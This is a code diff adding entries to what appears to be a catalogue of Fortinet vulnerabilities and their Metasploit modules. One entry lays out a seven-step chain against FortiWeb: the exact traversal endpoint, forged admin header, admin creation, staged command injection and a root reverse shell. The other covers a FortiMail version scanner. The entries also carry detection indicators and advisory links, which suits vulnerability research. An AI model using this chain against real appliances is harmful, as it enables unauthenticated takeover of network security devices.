@@ -289,6 +289,102 @@ FMSF_F05_SSH_BACKDOOR = {
 
 
 # ---------------------------------------------------------
+# FMSF-F06: CVE-2025-64446 + CVE-2025-58034 -- FortiWeb double-CVE unauth RCE
+# ---------------------------------------------------------
+FMSF_F06_FORTIWEB_RCE = {
+    "id":       "FMSF-F06",
+    "product":  "Fortinet FortiWeb",
+    "cve":      ["CVE-2025-64446 (auth bypass)", "CVE-2025-58034 (command injection)"],
+    "severity": "CRITICAL -- pre-auth RCE as root via two chained CVEs",
+    "class":    "Path traversal auth bypass + CLI command injection (CWE-22 + CWE-78)",
+    "disclosed": "2025-11-14 (CVE-2025-64446), 2025-11-18 (CVE-2025-58034)",
+
+    "cve_64446_auth_bypass": {
+        "description": (
+            "POST /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi bypasses authentication. "
+            "The %3F (URL-encoded ?) causes the router to treat /api/v2.0/cmdb/system/admin as an API path "
+            "and the ? as a query string delimiter, but path traversal /../../../../../cgi-bin/fwbcgi "
+            "reaches the raw CGI backend. "
+            "The CGIINFO header carries admin context as base64-encoded JSON: "
+            "{username, profname, vdom, loginname} -- the CGI trusts this header. "
+            "No authentication check is performed because the path traversal bypasses the auth middleware."
+        ),
+        "endpoint":  "POST /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi",
+        "headers":   {"CGIINFO": "base64({username: 'admin', profname: 'prof_admin', vdom: 'root', loginname: 'admin'})"},
+        "body":      "JSON payload for admin creation (name, password, access-profile, trusthostv4=0.0.0.0/0)",
+        "success":   "HTTP 200; admin account created with full access and any-IP trusthost",
+        "failure_indicator": "HTTP 403 = patched",
+    },
+
+    "cve_58034_command_injection": {
+        "description": (
+            "After auth (POST /logincheck with username + secretkey), the /httpclirqst endpoint "
+            "accepts CLI commands. Command injection limited to 63 characters per request. "
+            "MSF module chunks the payload and stages it to /tmp via echo commands, "
+            "then executes the staged payload via Python subprocess with start_new_session=True "
+            "(or preexec_fn=os.setsid on Python 2) to survive TCP connection close. "
+            "The WebSocket endpoint /ws/cli/open provides an interactive CLI session as root."
+        ),
+        "auth_endpoint":  "POST /logincheck (body: username=<user>&secretkey=<pass>)",
+        "auth_cookie":    "APSCOOKIE_FWEB",
+        "cli_endpoint":   "POST /httpclirqst (sid=<session>, session_id=<csrf_token>)",
+        "ws_endpoint":    "WS /ws/cli/open",
+        "cmd_limit":      "63 characters per injection; payload chunked and staged to /tmp",
+        "detach":         "Python subprocess with start_new_session=True (Python 3) or os.setsid (Python 2)",
+    },
+
+    "exploit_chain": [
+        "1. POST /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi + CGIINFO header -> create admin",
+        "2. POST /logincheck with new admin credentials -> receive APSCOOKIE_FWEB cookie",
+        "3. GET /api/v2.0/system/state -> get CSRF token and system state (version detection)",
+        "4. POST /httpclirqst to open CLI session -> get console_session_id",
+        "5. POST /httpclirqst with chunked echo commands -> stage payload to /tmp",
+        "6. POST /httpclirqst to execute staged payload via Python subprocess",
+        "7. Root reverse shell connects back",
+    ],
+
+    "detection": "POST to /api/v2.0/cmdb/system/admin%3F/ from unexpected source; new admin created; CLI session from IP not in admin trusthost",
+    "references": [
+        "https://attackerkb.com/topics/zClpINmLCh/cve-2025-58034/rapid7-analysis",
+        "https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass",
+        "https://www.fortiguard.com/psirt/FG-IR-25-910",
+        "https://www.fortiguard.com/psirt/FG-IR-25-513",
+    ],
+}
+
+
+# ---------------------------------------------------------
+# FMSF-F07: CVE-2020-9294 -- FortiMail unauthenticated login bypass (scanner)
+# ---------------------------------------------------------
+FMSF_F07_FORTIMAIL_BYPASS = {
+    "id":       "FMSF-F07",
+    "product":  "Fortinet FortiMail",
+    "cve":      "CVE-2020-9294",
+    "severity": "CRITICAL -- unauthenticated admin login bypass",
+    "class":    "Authentication bypass",
+    "module_type": "Scanner/detector only (MSF Auxiliary); not full exploit",
+
+    "description": (
+        "FortiMail admin panel (/admin/AdminLogin.html) is vulnerable to unauthenticated login bypass. "
+        "The MSF module is a scanner/detector only: it fingerprints the FortiMail build version "
+        "from the JS file reference 'fml-admin-login-<N>.js' in the admin login page "
+        "and checks if the build falls in a known vulnerable range."
+    ),
+
+    "vulnerable_build_ranges": [140, 160, 730, 745, 250, 263],
+    "detection_pattern":       "GET /admin/AdminLogin.html -> extract fml-admin-login-<N>.js version; check range",
+    "admin_panel":             "/admin/AdminLogin.html",
+    "indicator":               "Response contains 'newpassword' field + JS file with build in vulnerable range",
+
+    "note": (
+        "The actual bypass mechanism is NOT in the MSF module (scanner only). "
+        "See redguard.ch research for full bypass technique."
+    ),
+    "reference": "https://www.redguard.ch/blog/2020/07/02/fortimail-unauthenticated-login-bypass/",
+}
+
+
+# ---------------------------------------------------------
 # CVE PoC repo notes
 # ---------------------------------------------------------
 CVE_POC_NOTES = {
